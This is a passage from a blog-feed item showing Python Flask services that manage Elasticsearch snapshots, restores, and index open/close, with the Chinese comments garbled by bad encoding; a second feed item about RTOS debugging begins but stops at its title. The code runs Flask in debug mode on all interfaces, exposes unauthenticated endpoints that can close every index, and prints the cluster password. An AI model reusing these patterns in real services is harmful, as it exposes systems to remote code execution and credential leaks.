    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œå‚æ•°</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-built_in">print</span>(response.text)

        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
            <span class="hljs-string">"data"</span>: response.text
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–å¿«ç…§çŠ¶æ€å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/create_snapshot'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_create_snapshot</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šåˆ›å»ºå¿«ç…§
    æ‰§è¡Œå‘½ä»¤: PUT _snapshot/plrs_target_ps_visit_precondition/prd_01
    """</span>
    <span class="hljs-comment"># ä½¿ç”¨é»˜è®¤å‚æ•°åŒ¹é…æŒ‡å®šçš„å¿«ç…§åˆ›å»ºå‘½ä»¤</span>
    ignore_unavailable = <span class="hljs-literal">True</span>
    include_global_state = <span class="hljs-literal">False</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    snapshot = data.get(<span class="hljs-string">'snapshot'</span>)
    indices = data.get(<span class="hljs-string">'indices'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)

    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>"</span>

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚ä½“</span>
    body = {
        <span class="hljs-string">"indices"</span>: indices,
        <span class="hljs-string">"ignore_unavailable"</span>: ignore_unavailable,
        <span class="hljs-string">"include_global_state"</span>: include_global_state
    }

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ PUT è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.put(url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-comment"># è¿”å› JSON å“åº”æ•°æ®</span>
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"å¿«ç…§åˆ›å»ºæˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"åˆ›å»ºå¿«ç…§å¤±è´¥"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8888</span>, debug=<span class="hljs-literal">True</span>)
</code></pre>
<p>es-restore.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> toml
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, jsonify, request
app = Flask(__name__)


<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">set_config</span>(<span class="hljs-params">config_name</span>):
    <span class="hljs-string">"""
    è·å–é…ç½®ä¿¡æ¯å¹¶è®¾ç½®å…¨å±€å˜é‡
    """</span>
    <span class="hljs-keyword">global</span> ES_HOST, ES_PORT, PROTOCOL, USERNAME, PASSWORD

    <span class="hljs-keyword">try</span>:
        file_path = <span class="hljs-string">r"D:\work\es_re_config.toml"</span>
        config = toml.load(file_path)[config_name]

        <span class="hljs-comment"># è®¾ç½®å…¨å±€å˜é‡</span>
        ES_HOST = config.get(<span class="hljs-string">'es_host'</span>)
        ES_PORT = config.get(<span class="hljs-string">'es_port'</span>)
        PROTOCOL = config.get(<span class="hljs-string">'protocol'</span>)
        USERNAME = config.get(<span class="hljs-string">'username'</span>)
        PASSWORD = config.get(<span class="hljs-string">'password'</span>)

        <span class="hljs-built_in">print</span>({
            <span class="hljs-string">'ES_HOST'</span>: ES_HOST,
            <span class="hljs-string">'ES_PORT'</span>: ES_PORT,
            <span class="hljs-string">'PROTOCOL'</span>: PROTOCOL,
            <span class="hljs-string">'USERNAME'</span>: USERNAME,
            <span class="hljs-string">'PASSWORD'</span>: PASSWORD
        })
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ è½½é…ç½®å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-comment">#----------------------------åŠ è½½é…ç½®æ–‡ä»¶---------------------------#</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_es_indices_status</span>(<span class="hljs-params">es_host, es_port=<span class="hljs-number">9200</span>, protocol=<span class="hljs-string">'http'</span>, username=<span class="hljs-literal">None</span>, password=<span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    è·å– Elasticsearch æ‰€æœ‰ç´¢å¼•çš„çŠ¶æ€ä¿¡æ¯

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·ï¼Œé»˜è®¤ä¸º 9200
        protocol (str): åè®®ç±»å‹ï¼Œé»˜è®¤ä¸º 'http'
        username (str): ç”¨æˆ·åï¼Œç”¨äºåŸºæœ¬è®¤è¯
        password (str): å¯†ç ï¼Œç”¨äºåŸºæœ¬è®¤è¯

    Returns:
        dict: ç´¢å¼•çŠ¶æ€ä¿¡æ¯
    """</span>
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{protocol}</span>://<span class="hljs-subst">{es_host}</span>:<span class="hljs-subst">{es_port}</span>/_cat/indices/*"</span>

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'h'</span>: <span class="hljs-string">'index,status'</span>,  <span class="hljs-comment"># åªè¿”å›ç´¢å¼•åå’ŒçŠ¶æ€</span>
        <span class="hljs-string">'expand_wildcards'</span>: <span class="hljs-string">'all'</span>  <span class="hljs-comment"># å±•å¼€æ‰€æœ‰é€šé…ç¬¦åŒ¹é…çš„ç´¢å¼•</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">and</span> password:
        auth = (username, password)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-comment"># å¤„ç†å“åº”æ•°æ®</span>
        indices_data = response.text.strip()
        <span class="hljs-keyword">if</span> indices_data:
            <span class="hljs-comment"># æŒ‰è¡Œåˆ†å‰²å¹¶å¤„ç†æ•°æ®</span>
            lines = indices_data.split(<span class="hljs-string">'\n'</span>)
            indices_status = {}
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                <span class="hljs-keyword">if</span> line.strip():
                    parts = line.strip().split()
                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">2</span>:
                        index_name = parts[<span class="hljs-number">0</span>]
                        status = parts[<span class="hljs-number">1</span>]
                        indices_status[index_name] = status
            <span class="hljs-comment"># 2. è¿‡æ»¤å‡ºéç³»ç»Ÿç´¢å¼•</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ­£åœ¨è¿‡æ»¤éç³»ç»Ÿç´¢å¼•..."</span>)
            non_system_indices = filter_non_system_indices(indices_status)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…±æ‰¾åˆ° <span class="hljs-subst">{<span class="hljs-built_in">len</span>(non_system_indices)}</span> ä¸ªéç³»ç»Ÿç´¢å¼•:"</span>)
            <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> non_system_indices:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - <span class="hljs-subst">{index}</span>"</span>)
            <span class="hljs-keyword">return</span> non_system_indices
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {}

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯·æ±‚ Elasticsearch å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_non_system_indices</span>(<span class="hljs-params">indices_status</span>):
    <span class="hljs-string">"""
    è¿‡æ»¤å‡ºæ‰€æœ‰éç³»ç»Ÿç´¢å¼•ï¼ˆä¸ä»¥ . å¼€å¤´çš„ç´¢å¼•ï¼‰

    Args:
        indices_status (dict): æ‰€æœ‰ç´¢å¼•åŠå…¶çŠ¶æ€

    Returns:
        list: éç³»ç»Ÿç´¢å¼•åˆ—è¡¨
    """</span>
    non_system_indices = []
    <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_status.keys():
        <span class="hljs-comment"># è¿‡æ»¤æ‰ä»¥ . å¼€å¤´çš„ç³»ç»Ÿç´¢å¼•</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> index_name.startswith(<span class="hljs-string">'.'</span>):
            non_system_indices.append(index_name)

    <span class="hljs-keyword">return</span> non_system_indices

<span class="hljs-comment"># é€ä¸ªå…³é—­ç´¢å¼•</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/close_individual_indices'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">close_individual_indices</span>():
    data = request.get_json()
    indices_list = data.get(<span class="hljs-string">'indices_list'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-string">"""
    é€ä¸ªå…³é—­ç´¢å¼•ï¼ˆæ›´å®‰å…¨çš„æ–¹å¼ï¼‰

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·
        protocol (str): åè®®ç±»å‹
        username (str): ç”¨æˆ·å
        password (str): å¯†ç 
        indices_list (list): è¦å…³é—­çš„ç´¢å¼•åˆ—è¡¨,ä¾èµ–æ¥å£ä¼ é€’ï¼Œå¦‚æœæ˜¯ç©ºå°±è·å–å…¨éƒ¨

    Returns:
        dict: å…³é—­æ“ä½œç»“æœç»Ÿè®¡
    """</span>
    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    success_count = <span class="hljs-number">0</span>
    failed_count = <span class="hljs-number">0</span>
    details = []
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indices_list:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
            url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/*,-.*,-system*,-ilm*,-kibana*,-.kibana*/_close"</span>

            <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å…³é—­å•ä¸ªç´¢å¼•</span>
            response = requests.post(url, auth=auth)
            response.raise_for_status()

        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…³é—­ç´¢å¼• * å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            details.append({<span class="hljs-string">"index"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_list:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
                url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/<span class="hljs-subst">{index_name}</span>/_close"</span>

                <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å…³é—­å•ä¸ªç´¢å¼•</span>
                response = requests.post(url, auth=auth)
                response.raise_for_status()

                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æˆåŠŸå…³é—­ç´¢å¼•: <span class="hljs-subst">{index_name}</span>"</span>)
                success_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>})

            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…³é—­ç´¢å¼• <span class="hljs-subst">{index_name}</span> å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
                failed_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"data"</span>: {
            <span class="hljs-string">"success"</span>: success_count,
            <span class="hljs-string">"failed"</span>: failed_count,
            <span class="hljs-string">"details"</span>: details
        }
    })

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/open_individual_indices'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">open_individual_indices</span>():
    data = request.get_json()
    indices_list = data.get(<span class="hljs-string">'indices_list'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-string">"""
    é€ä¸ªå¼€å¯ç´¢å¼•ï¼ˆæ›´å®‰å…¨çš„æ–¹å¼ï¼‰

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·
        protocol (str): åè®®ç±»å‹
        username (str): ç”¨æˆ·å
        password (str): å¯†ç 
        indices_list (list): è¦å¼€å¯çš„ç´¢å¼•åˆ—è¡¨

    Returns:
        dict: å¼€å¯æ“ä½œç»“æœç»Ÿè®¡
    """</span>
    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    success_count = <span class="hljs-number">0</span>
    failed_count = <span class="hljs-number">0</span>
    details = []

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indices_list:
        <span class="hljs-comment"># å¼€å¯æ‰€æœ‰ç´¢å¼•</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
            url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_all/_open"</span>

            <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å¼€å¯å•ä¸ªç´¢å¼•</span>
            response = requests.post(url, auth=auth)
            response.raise_for_status()

        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å¯ç´¢å¼•_allå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
            details.append({<span class="hljs-string">"index"</span>: <span class="hljs-string">"_all"</span>, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> index_name <span class="hljs-keyword">in</span> indices_list:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
                url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/<span class="hljs-subst">{index_name}</span>/_open"</span>

                <span class="hljs-comment"># å‘é€ POST è¯·æ±‚å¼€å¯å•ä¸ªç´¢å¼•</span>
                response = requests.post(url, auth=auth)
                response.raise_for_status()

                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æˆåŠŸå¼€å¯ç´¢å¼•: <span class="hljs-subst">{index_name}</span>"</span>)
                success_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"success"</span>})

            <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å¯ç´¢å¼• <span class="hljs-subst">{index_name}</span> å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
                failed_count += <span class="hljs-number">1</span>
                details.append({<span class="hljs-string">"index"</span>: index_name, <span class="hljs-string">"status"</span>: <span class="hljs-string">"failed"</span>, <span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)})

    <span class="hljs-keyword">return</span> jsonify({
        <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
        <span class="hljs-string">"message"</span>: <span class="hljs-string">"success"</span>,
        <span class="hljs-string">"data"</span>: {
            <span class="hljs-string">"success"</span>: success_count,
            <span class="hljs-string">"failed"</span>: failed_count,
            <span class="hljs-string">"details"</span>: details
        }
    })


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/restore_snapshot'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">api_restore_snapshot</span>():
    <span class="hljs-string">"""
    APIæ¥å£ï¼šæ¢å¤å¿«ç…§
    æ‰§è¡Œå‘½ä»¤: POST _snapshot/ali_es_backup/prd_01/_restore
    """</span>
    <span class="hljs-comment"># ä½¿ç”¨å›ºå®šçš„å‚æ•°æ¥åŒ¹é…æŒ‡å®šçš„æ¢å¤å‘½ä»¤</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    snapshot =  data.get(<span class="hljs-string">'snapshot'</span>)
    indices = data.get(<span class="hljs-string">'indices'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    get_url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>"</span>
    post_url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/<span class="hljs-subst">{snapshot}</span>/_restore"</span>
    <span class="hljs-built_in">print</span>(get_url)
    <span class="hljs-built_in">print</span>(post_url)

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚ä½“ - åŒ¹é…æŒ‡å®šå‘½ä»¤çš„å‚æ•°</span>
    body = {
        <span class="hljs-string">"indices"</span>: indices
    }
    <span class="hljs-built_in">print</span>(body)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ POST è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.get(get_url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–å¿«ç…§å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ POST è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œè¯·æ±‚ä½“</span>
        response = requests.post(post_url, auth=auth, json=body)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>

        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"å¿«ç…§æ¢å¤æˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"æ¢å¤å¿«ç…§å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/api/get_all_snapshots'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_all_snapshots</span>():
    <span class="hljs-string">"""
    è·å–æŒ‡å®šä»“åº“ä¸‹æ‰€æœ‰å¿«ç…§çš„ä¿¡æ¯

    Args:
        es_host (str): Elasticsearch ä¸»æœºåœ°å€
        es_port (int): Elasticsearch ç«¯å£å·ï¼Œé»˜è®¤ä¸º 9200
        protocol (str): åè®®ç±»å‹ï¼Œé»˜è®¤ä¸º 'http'
        username (str): ç”¨æˆ·åï¼Œç”¨äºåŸºæœ¬è®¤è¯
        password (str): å¯†ç ï¼Œç”¨äºåŸºæœ¬è®¤è¯
        repository (str): å¿«ç…§ä»“åº“åç§°

    Returns:
        dict: å¿«ç…§ä¿¡æ¯
    """</span>
    data = request.get_json()
    repository = data.get(<span class="hljs-string">'repository'</span>)
    config_name = data.get(<span class="hljs-string">'config_name'</span>)
    set_config(config_name)
    <span class="hljs-comment"># æ„å»ºè¯·æ±‚ URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{PROTOCOL}</span>://<span class="hljs-subst">{ES_HOST}</span>:<span class="hljs-subst">{ES_PORT}</span>/_snapshot/<span class="hljs-subst">{repository}</span>/_all"</span>
    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å‚æ•°</span>
    params = {
        <span class="hljs-string">'filter_path'</span>: <span class="hljs-string">'snapshots.name,snapshots.snapshot,snapshots.state,snapshots.start_time,snapshots.end_time'</span>
    }

    <span class="hljs-comment"># è®¾ç½®è®¤è¯ä¿¡æ¯</span>
    auth = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> USERNAME <span class="hljs-keyword">and</span> PASSWORD:
        auth = (USERNAME, PASSWORD)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€ GET è¯·æ±‚ï¼Œæ·»åŠ è®¤è¯ä¿¡æ¯å’Œå‚æ•°</span>
        response = requests.get(url, params=params, auth=auth)
        response.raise_for_status()  <span class="hljs-comment"># æ£€æŸ¥è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>
        <span class="hljs-comment"># è¿”å› JSON å“åº”æ•°æ®</span>
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"è·å–æˆåŠŸ"</span>,
            <span class="hljs-string">"data"</span>: response.json()
        })

    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> jsonify({
            <span class="hljs-string">"code"</span>: <span class="hljs-number">500</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"è·å–ä¿¡æ¯å¤±è´¥: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
            <span class="hljs-string">"data"</span>: <span class="hljs-literal">None</span>
        })


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">6666</span>, debug=<span class="hljs-literal">True</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ]]></title>    <link>https://juejin.cn/post/7580809247736643624</link>    <guid>https://juejin.cn/post/7580809247736643624</guid>    <pubDate>2025-12-08T04:43:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736643624" data-draft-id="7580988382761107471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:43:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·938559462475"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VSCode + Renode è°ƒè¯•æˆ‘æ‰‹å·¥å®ç°çš„ RTOSï¼šä¸€æ¬¡å½»åº•æ”¹å˜æˆ‘å¼€å‘æ–¹å¼çš„ä½“éªŒ
